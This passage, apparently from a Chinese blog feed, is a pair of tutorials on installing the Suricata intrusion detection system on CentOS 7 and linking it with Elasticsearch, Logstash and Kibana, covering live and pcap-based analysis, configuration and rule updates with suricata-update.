\/usr/share/logstash/x-pack/modules/azure/configuration/kibana<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-5-相关配置总结"><a href="#3-5-相关配置总结" class="headerlink" title="3.5 相关配置总结"></a>3.5 相关配置总结</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">##suricata</span>/var/log/suricata/ <span class="token comment" spellcheck="true">#日志目录</span><span class="token comment" spellcheck="true">##elk日志目录log:</span><span class="token function">tail</span> -n 20  /var/log/messages <span class="token comment" spellcheck="true">##ES:/usr/share/elasticsearch</span>/usr/share/elasticsearch/bin/elasticsearch<span class="token comment" spellcheck="true">#安装目录</span><span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/elasticsearch/elasticsearch.yml<span class="token function">vi</span> /etc/elasticsearch/elasticsearch.ymlpath.data: /var/lib/elasticsearchpath.logs: /var/log/elasticsearch<span class="token comment" spellcheck="true">##logstash:</span>/usr/share/logstash/bin/logstash<span class="token comment" spellcheck="true">#安装目录</span>path.data: /var/lib/logstashpipeline.ordered: autopath.logs: /var/log/logstash<span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/logstash/conf.d/logstash.conf/etc/logstash/logstash.yml <span class="token comment" spellcheck="true">##kibana:</span>/usr/share/kibana/bin/kibana<span class="token comment" spellcheck="true">#安装目录</span><span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/kibana/kibana.yml <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-在线模式部署"><a href="#4-在线模式部署" class="headerlink" title="4 在线模式部署"></a>4 在线模式部署</h1><p>在线模式部署：即suricata实时处理其他机器镜像过来的流量。然后elk进行数据化展示。</p><p>依次开启kibana elasticsearch logstash，这里需要注意的是logstash不能采用默认开启方式systemctl start logstash，因为默认配置不加载/etc/logstash/conf.d/logstash.conf文件，则加载不成功suricata日志。具体命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl start kibana logstash elasticsearchsystemctl start logstash<span class="token comment" spellcheck="true">#错误开启，不会加载配置文件/etc/logstash/conf.d/logstash.conf</span><span class="token function">nohup</span> /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf <span class="token operator">&amp;</span> <span class="token comment" spellcheck="true">#指定配置文件开启logstash  正确操作</span><span class="token function">sudo</span> <span class="token function">nohup</span> /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -i eth0 --init-errors-fatal <span class="token operator">&amp;</span>  <span class="token comment" spellcheck="true">#启动suricata</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>开启成功后，访问kibina,可以看到suricata日志数据。</p><p><img src="/2020/09/11/install-guide-elk-suricata/1603951881328.png" alt="1603951881328"></p><h1 id="5-离线模式部署"><a href="#5-离线模式部署" class="headerlink" title="5 离线模式部署"></a>5 离线模式部署</h1><h2 id="5-1-suricata分析流量包功能"><a href="#5-1-suricata分析流量包功能" class="headerlink" title="5.1 suricata分析流量包功能"></a>5.1 suricata分析流量包功能</h2><p> 分析单个包：suricata -r pcap文件名 -l 自定义输出位置</p><p> 分析文件夹里所以的包：suricata -r pcap文件夹名 -l 自定义输出位置 </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -r /tmp/test.cap -l  /var/log/suricata/cap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-2-离线模式工作原理"><a href="#5-2-离线模式工作原理" class="headerlink" title="5.2 离线模式工作原理"></a>5.2 离线模式工作原理</h2><p>离线模式工作原理：离线一词即，流量收集集群将抓取的流量scp定时发送到ids主机，然后ids主机定时启动suricata -r分析cap流量文件，然后推送到elk进行展示。该过程涉及两个部分。其中定时采用linux的crontab。</p><p>（1）流量收集集群定时推送流量文件到ids主机</p><p>定时推送流量到ids主机脚本send.sh如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">scp</span> -Rf /root/testdir/ wasadmin@10.127.40.25:/root/temp/<span class="token comment" spellcheck="true">#复制到ids文件夹/root/temp/</span><span class="token function">rm</span> -rf /root/testdir/*<span class="token comment" spellcheck="true">#删除该主机文件夹下的所有文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（2）ids主机定时分析</p><p>ids主机定时分析脚本如下suricara.sh：</p><pre class="line-numbers language-bash"><code class="language-bash">suricata -c /etc/suricata/suricata.yaml -r /root/temp/<span class="token function">rm</span> -rf /root/temp/*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>定时执行suricara.sh，在终端输入以下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在显示的文件末尾添加以下规则：#每5分钟运行一次time.sh脚本,并把错误和正确的日志都存到/tmp/load.log上。</p><pre class="line-numbers language-bash"><code class="language-bash">*/5 * * * * /root/time.sh <span class="token operator">></span> /tmp/load.log 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑完成，保存完成以后，就会显示以下提示信息：</p><pre class="line-numbers language-bash"><code class="language-bash">crontab: installing new <span class="token function">crontab</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这就说明正在安装新的定时任务，如果没有这条提示信息，请重新运行<code>crontab -e</code>命令。</p><p><img src="/2020/09/11/install-guide-elk-suricata/1604578836302-1611127871322.png" alt="1604578836302"></p><h1 id="错误解决"><a href="#错误解决" class="headerlink" title="错误解决"></a>错误解决</h1><p><img src="/2020/09/11/install-guide-elk-suricata/1603938736430.png" alt="1603938736430"></p><p><a href="https://blog.csdn.net/weixin_44105991/article/details/91320644">Solution</a>：</p><p>1 先执行命令 free -m查看内存是不是还有 最主要的是 看有没有交换空间 swap  </p><p>2  创建swapfile：dd if=/dev/zero of=swapfile bs=1024 count=500000</p><p>3  将swapfile设置为swap空间    mkswap swapfile </p><p>4  启用交换空间   swapon swapfile ( 删除交换空间是swapoff swapfile )</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">free</span> -m<span class="token function">dd</span> if<span class="token operator">=</span>/dev/zero of<span class="token operator">=</span>swapfile bs<span class="token operator">=</span>1024 count<span class="token operator">=</span>500000mkswap swapfile swapon swapfile <span class="token function">free</span> -m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/_Logstash_Kibana_and_Suricata_JSON_output">官网suricata+elk部署指南</a></p><p><a href="https://www.elastic.co/cn/downloads/">elk官方下载连接</a></p><p><a href="http://www.justdojava.com/2019/08/11/elk-install/">elk部署教程</a> 简单清晰</p><p><a href="https://zhuanlan.zhihu.com/p/64742715">suricata+elk其他部署方式</a></p><p><a href="https://developer.ibm.com/zh/articles/os-cn-elk-filebeat/">elk架构+filebeat解析</a></p><p><a href="https://developer.ibm.com/zh/articles/os-cn-elk-filebeat/">elk日志收集教程</a></p><p><a href="https://aws.amazon.com/cn/blogs/china/using-vpc-traffic-mirroring-to-construct-network-intrusion-detection-system-update/">借助 VPC Traffic Mirroring 构建网络入侵检测系统</a>  实时分析流量</p><p><a href="https://www.freebuf.com/articles/network/249549.html">elk+suricata(docker部署)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos7中安装suricata</title>
      <link href="/2020/09/11/install-guide-suricata/"/>
      <url>/2020/09/11/install-guide-suricata/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>由于不断的安全威胁，入侵检测系统（IDS）已成为当今<a href="http://www.learnfuture.com/product/datacenter">数据中心</a>环境中最关键的要求之一。但是，随着越来越多的服务器将其NIC升级到10GB / 40GB以太网，以线速在商用硬件上实施计算密集型入侵检测变得越来越困难。扩展IDS性能的一种方法是多线程IDS，其中CPU密集型深度数据包检查工作负载并行化为多个并发任务。这种并行检查可以利用多核硬件轻松扩展IDS吞吐量。这个领域的两个着名的开源工作是Suricata和Bro。</p><p>在本教程中，我将演示如何在<a href="http://www.learnfuture.com/Linux">Linux</a>服务器上安装和配置Suricata IDS。</p><a id="more"></a><p>官网： <a href="https://suricata-ids.org/">https://suricata-ids.org/</a> </p><p>官网安装教程： <a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Suricata_Installation">https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Suricata_Installation</a> </p><p>centos官网安装教程： <a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/CentOS_Installation">https://redmine.openinfosecfoundation.org/projects/suricata/wiki/CentOS_Installation</a> </p><h1 id="一安装教程"><a href="#一安装教程" class="headerlink" title="一安装教程"></a>一安装教程</h1><p>操作系统：Centos7</p><p>安装版本：suricata6.0.0</p><p>1)安装wget</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@suricata~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum install wget -y</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2)更换源</p><p>　　更换成阿里云源，更新系统、下载软件速度快</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@suricata~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><span class="token punctuation">[</span>root@suricata~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><span class="token punctuation">[</span>root@suricata~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum clean all</span><span class="token punctuation">[</span>root@suricata~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum makecache</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>3)更新系统</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum -y update</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603261907715.png" alt="1603261907715"></p><p>4)安装epel</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum install epel-release</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603261947721.png" alt="1603261947721"></p><p>5)安装相关依赖</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo yum -y install gcc libpcap-devel pcre-devel libyaml-devel file-devel \</span>zlib-devel jansson-devel nss-devel libcap-ng-devel libnet-devel <span class="token function">tar</span> <span class="token function">make</span> \libnetfilter_queue-devel lua-devel PyYAML libmaxminddb-devel rustc cargo \lz4-devel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603262215276.png" alt="1603262215276"></p><p>6)开始安装suricata</p><p>这里尝试安装官网<a href="https://www.openinfosecfoundation.org/download/suricata-6.0.0.tar.gz">最新6.0版本</a></p><p> <a href="https://suricata-ids.org/download/">https://suricata-ids.org/download/</a> </p><p><img src="/2020/09/11/install-guide-suricata/1603262265601.png" alt="1603262265601"></p><p>下载安装包，进行解压配置安装：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># wget https://www.openinfosecfoundation.org/download/suricata-6.0.0.tar.gz</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tar -xvzf suricata-6.0.0.tar.gz</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd suricata-6.0.0</span><span class="token punctuation">[</span>root@m01ly suricata-6.0.0<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var --enable-nfqueue --enable-lua</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603262683253.png" alt="1603262683253"></p><p>之后再编译安装</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly suricata-6.0.0<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#make</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly suricata-6.0.0<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#sudo make install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603878275030.png" alt="1603878275030"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly suricata-6.0.0<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#sudo ldconfig</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后进行一些配置：</p><p>（1）自动为您创建/设置所有必需的目录和suricata.yaml：</p><pre><code>[root@m01ly suricata-6.0.0]#make install-conf</code></pre><p>（2） 自动配置规则集</p><pre><code>[root@m01ly suricata-6.0.0]#make install-rules</code></pre><p>将执行常规的“ make install”，然后它将自动从Suricata的“ Emerging Threats ”中下载并设置最新规则集</p><p>（3）将结合上述所有内容（install-conf和install-rules）-并为您提供可以运行（配置和设置）的Suricata</p><pre><code>[root@m01ly suricata-6.0.0]#make install-full</code></pre><p>安装完成后，安装目录为：/etc/suricata，配置文件为/etc/suricata/suricata.yaml</p><h1 id="二-基础配置"><a href="#二-基础配置" class="headerlink" title="二 基础配置"></a>二 基础配置</h1><p>按照<a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Basic_Setup">官方基础配置</a>一步步就可。注意图中的cp指令一块不需要操作，6.0版本自动会复制。<img src="/2020/09/11/install-guide-suricata/1603693471544.png" alt="1603693471544"></p><p>(1) 创建目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> /var/log/suricata<span class="token function">sudo</span> <span class="token function">mkdir</span> /etc/suricata<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>[root@ids0001 suricata-5.0.0]# cd etc[root@ids0001 etc]# lsclassification.config  Makefile.am  reference.config    suricata.logrotate.in  suricata.service.inMakefile               Makefile.in  suricata.logrotate  suricata.service[root@ids0001 etc]# sudo cp classification.config /etc/suricata[root@ids0001 etc]# sudo cp reference.config /etc/suricata</code></pre><p><img src="/2020/09/11/install-guide-suricata/1603855808097.png" alt="1603855808097"></p><pre><code>./configure &amp;&amp; make &amp;&amp; make install-conf</code></pre><p>需要一段时间，最后结果：</p><p><img src="/2020/09/11/install-guide-suricata/1603878960614.png" alt="1603878960614"></p><p>自动下载和设置从正在出现的威胁可Suricata最新的规则集。</p><p>./configure &amp;&amp; make &amp;&amp; make install-rules</p><p>需要又一段时间，最后结果：</p><p>./configure &amp;&amp; make &amp;&amp; make install-full</p><h2 id="2-1-基础配置"><a href="#2-1-基础配置" class="headerlink" title="2.1 基础配置"></a>2.1 基础配置</h2><p> 配置文件位于**/etc/suricata/suricata.yaml**。用VIM打开</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd /etc/suricata/</span><span class="token punctuation">[</span>root@m01ly suricata<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vim suricata.yaml</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（1）配置要拦截的流量设置</p><p> 在“vars”部分下，您将找到Suricata使用的几个重要变量。</p><p>“HOME_NET”应指向Suricata要检查的本地网络。</p><p>“！$ HOME_NET”（分配给EXTERNAL_NET）是指除本地网络之外的任何其他网络。</p><p>“XXX_PORTS”表示不同服务使用的端口号。请注意，无论使用何种端口，Suricata都可以自动检测HTTP流量。因此，正确指定HTTP_PORTS变量并不重要。</p><p>先设置HOME_NET与EXTERNAL_NET，推荐HOME_NET填写内网网段，EXTERNAL_NET设置为any</p><p>注意如果HOME_NET设置了any，EXTERNAL_NET设置！HOME_NET的话会报错，如果HOME_NET设置了内网地址，EXTERNAL_NET设置为！$HOME_NET的话，有些内网之间的告警就无法匹配到 </p><p><img src="/2020/09/11/install-guide-suricata/1603708931016.png" alt="1603708931016"></p><p>（2）指定日志文件目录</p><p><img src="/2020/09/11/install-guide-suricata/1603708864025.png" alt="1603708864025"></p><p>（3） host-os-policy 配置，在文件百分之60处。</p><p> “host-os-policy”部分用于防御一些众所周知的攻击，这些攻击利用操作系统的网络堆栈（例如，TCP重组）的行为来逃避检测。作为对策，现代IDS提出了所谓的“基于目标”的检查，其中检查引擎基于流量的目标操作系统微调其检测算法。因此，如果您知道正在运行的OS个别本地主机，您可以将该信息提供给Suricata以提高其检测率。 </p><p><img src="/2020/09/11/install-guide-suricata/1603709095833.png" alt="1603709095833"></p><p>（4）线程</p><p>在“线程”部分下，您可以为不同的Suricata线程指定CPU关联。默认情况下，禁用CPU关联（“set-cpu-affinity：no”），这意味着将在任何可用的CPU核心上调度Suricata线程。默认情况下，Suricata将为每个CPU核心创建一个“检测”线程。您可以通过指定“detect-thread-ratio：N”来调整此行为。这将创建N * M个检测线程，其中M是主机上CPU核心的总数。</p><p>使用上述线程设置，Suricata将创建1.5 * M检测线程，其中M是系统上CPU核心的总数。</p><h2 id="2-2-启动"><a href="#2-2-启动" class="headerlink" title="2.2 启动"></a>2.2 启动</h2><h3 id="2-2-1-关闭-LRO-GRO"><a href="#2-2-1-关闭-LRO-GRO" class="headerlink" title="2.2.1 关闭 LRO / GRO"></a>2.2.1 关闭 LRO / GRO</h3><p>当您使用<code>pcap</code>捕获模式时，强烈建议关闭Suricata正在侦听的NIC上的任何数据包offloead功能（例如，LRO / GRO），因为这些功能可能会干扰实时数据包捕获。</p><p>以下是如何在网络接口eth0上关闭LRO / GRO：</p><pre><code>[root@m01ly ~]# sudo ethtool -K ens33 gro off lro off</code></pre><h3 id="2-2-2-测试是否配置成功："><a href="#2-2-2-测试是否配置成功：" class="headerlink" title="2.2.2 测试是否配置成功："></a>2.2.2 测试是否配置成功：</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># suricata -T</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603697120852.png" alt="1603697120852"></p><h3 id="2-2-3-运行模式"><a href="#2-2-3-运行模式" class="headerlink" title="2.2.3  运行模式"></a>2.2.3  运行模式</h3><p>Suricata支持多种运行模式。运行模式确定不同线程如何用于IDS。以下命令列出了所有<a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Runmodes">可用的runmodes</a>。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo /usr/local/bin/suricata --list-runmodes</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> Suricata使用的默认运行模式是<code>autofp</code>（代表“自动流固定负载平衡”）。在此模式下，来自每个不同流的数据包将分配给单个检测线程。将流分配给具有最少数量的未处理数据包的线程。 </p><h3 id="2-2-4-启动suricata"><a href="#2-2-4-启动suricata" class="headerlink" title="2.2.4 启动suricata"></a>2.2.4 启动suricata</h3><p>启动命令：sudo suricata -c 启动文件 -i 网卡名称 –init-errors-fatal：例如下面</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@suricata ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo /usr/local/bin/suricata -c /etc/suricata/suricata.yaml    -i ens33   -s /etc/suricata/rules/test.rules</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -i eth0 --init-errors-fatal</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603709547401.png" alt="1603709547401"></p><p>后台启用：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo nohup /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -i eth0 --init-errors-fatal &amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-2-5-查看日志"><a href="#2-2-5-查看日志" class="headerlink" title="2.2.5 查看日志"></a>2.2.5 查看日志</h3><p>Suricata检测日志存储在/ var / log / suricata目录中。</p><p>其中fast.log表示命中规则的日志。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tail -f /var/log/suricata/fast.log</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603713977753.png" alt="1603713977753"></p><p>为了便于导入，日志也以json格式提供：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tail -f /var/log/suricata/eve.json</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603714049656.png" alt="1603714049656"></p><h1 id="三-规则管理"><a href="#三-规则管理" class="headerlink" title="三 规则管理"></a>三 规则管理</h1><h2 id="3-1-规则介绍"><a href="#3-1-规则介绍" class="headerlink" title="3.1 规则介绍"></a>3.1 规则介绍</h2><h3 id="3-1-1-规则集"><a href="#3-1-1-规则集" class="headerlink" title="3.1.1 规则集"></a>3.1.1 规则集</h3><p>suricata系统自带的规则主要是et/open 规则，目前开源免费的就是et/open、pt规则、sslbl规则，其余的需要授权码才能更新，如下：</p><ol><li><a href="https://github.com/jasonish/suricata-trafficid/blob/master/rules/traffic-id.rules">Suricata作者写的一个规则生成的脚本</a>：生成用于应用和服务识别的规则。</li><li><a href="https://sslbl.abuse.ch/blacklist/sslblacklist.rule">瑞士的非盈利组织abuse.ch维护的项目</a>：他们维护的这个黑名单是标识恶意软件与僵尸网络相关的，列表里面提供了有关恶意软件与僵尸网络的ssl证书列表，根据证书特征来匹配流量中的威胁。他们提供了一个Suricata的规则，可以根据黑名单检测网络中的恶意连接。</li><li><a href="https://github.com/ptresearch/AttackDetection">PT的Suricata规则库</a>：根据恶意软件、黑客的网络通讯协议以及漏洞的poc去编写，里面包含了近几年常见cve漏洞的检测，更新十分及时。</li><li><a href="https://rules.emergingthreats.net/open/suricata/rules/">Emerging Threats维护的规则</a>：这个就比较熟悉了，我们一般常用的就是这个规则库。很强大的规则库，规则数量有20000+ 。<a href="http://doc.emergingthreats.net/bin/view/Main/EmergingFAQ#What_is_the_general_intent_of_ea">官方规则解释</a></li></ol><h3 id="3-1-2-规则管理工具"><a href="#3-1-2-规则管理工具" class="headerlink" title="3.1.2 规则管理工具"></a>3.1.2 规则管理工具</h3><p>规则管理，就是便于对suricata的规则进行统一的管理，比如更新、启用、停用等。相关的规则管理工具有很多，简单列举几个：   </p><ul><li><a href="https://github.com/jasonish/suricata-update">Suricata-Update</a> ：常用工具</li><li><a href="https://github.com/StamusNetworks/scirius">Scirius</a>：Scirius是个管理Suricata规则集的Web应用。搭建和使用也不难，参见github。</li><li><a href="https://www.jianshu.com/p/1a96770695db">Oinkmaster</a></li><li><a href="https://github.com/shirkdog/pulledpork">Pulledpork：</a></li></ul><h2 id="3-2-规则更新"><a href="#3-2-规则更新" class="headerlink" title="3.2 规则更新"></a>3.2 规则更新</h2><p>suricata规则更新可以使用suricata-update来进行更新, 输入suricata-update 会自动进行规则更新，显示当前已经更新与启用了多少规则 </p><h3 id="3-2-1-更新规则库"><a href="#3-2-1-更新规则库" class="headerlink" title="3.2.1 更新规则库"></a>3.2.1 更新规则库</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 最近的一次更新结果如下，规则总数为28178条： </p><p><img src="/2020/09/11/install-guide-suricata/1603697024470.png" alt="1603697024470"></p><p>规则更新后，所有的规则都会保存在/var/lib/suricata/rules/suricata.rules这一个文件中，这个时候就必须修改suricata配置文件suricata.yaml的default-rule-path与rule-files来指定规则文件到这个规则上:</p><pre class="line-numbers language-bash"><code class="language-bash">default-rule-path: /var/lib/suricata/rulesrule-files:  - suricata.rules<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-2-2-更新规则源"><a href="#3-2-2-更新规则源" class="headerlink" title="3.2.2 更新规则源"></a>3.2.2 更新规则源</h3><p>（1）更新规则源：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update update-sources</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603700557845.png" alt="1603700557845"></p><p>（2）列出更新源列表 suricata-update list-sources </p><p><img src="/2020/09/11/install-guide-suricata/1603697274919.png" alt="1603697274919"></p><p>每个规则集都有一个前缀为“vendor”的名称，后跟一个集名称。例如，iosf的traffic id规则集称为“iosf/trafficid”。</p><h3 id="3-2-3-启用某个规则集"><a href="#3-2-3-启用某个规则集" class="headerlink" title="3.2.3 启用某个规则集"></a>3.2.3 启用某个规则集</h3><p>要启用ptresearch/attackdetection的规则集：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update enable-source ptresearch/attackdetection</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603700718529.png" alt="1603700718529"></p><h3 id="3-2-4-禁用规则"><a href="#3-2-4-禁用规则" class="headerlink" title="3.2.4 禁用规则"></a>3.2.4 禁用规则</h3><p>使用Suricata-update更新规则时，默认是将所有规则合并在一个规则文件中：/var/lib/suricata/rules/suricata.rules。</p><p><img src="/2020/09/11/install-guide-suricata/1603705089676.png" alt="1603705089676"></p><p>Suricata-update有个 –no-merge参数，使用这个参数更新规则，规则不会进行合并，是以独立的文件存在于文件夹下。但是在管理规则的时候很不方便，必须要自己管理Suricata引入的规则。但是在禁用规则的时候，也可以使用suricata-update去配置disable.conf禁用的规则。不推荐使用 –no-merge参数更新规则。指定一个文件让suricata-update合并输出会更简单。在suricata.yaml中修改default-rule-path和rule-files。</p><p><img src="/2020/09/11/install-guide-suricata/1603708490301.png" alt="1603708490301"></p><p>通过suricata-udpate可以很好的控制规则，例如要禁用某一个规则，直接新建/etc/suricata/disable.conf 文件，然后在里面填入sid，每次更新的话会自动禁止该规则 </p><p>默认情况下 <code>suricata-update</code> 将所有规则合并到一个文件“/var/lib/suricata/rules”/苏里克塔规则”.</p><p>要启用默认禁用的规则，请使用 /etc/suricata/enable.conf</p><pre><code>2019401                   # enable signature with this sidgroup:emerging-icmp.rules # enable this rulefilere:trojan                 # enable all rules with this string</code></pre><p>类似地，要禁用规则，请使用 /etc/suricata/disable.conf ：</p><pre class="line-numbers language-bash"><code class="language-bash">2019401                   <span class="token comment" spellcheck="true"># disable signature with this sid</span>group:emerging-info.rules <span class="token comment" spellcheck="true"># disable this rulefile</span>re:heartbleed             <span class="token comment" spellcheck="true"># disable all rules with this string</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>更新这些文件后，</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update --disable-conf /etc/suricata/disable.conf</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重新运行 <code>suricata-update</code> 再一次：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#sudo suricata-update</span><span aria-hidden="true" 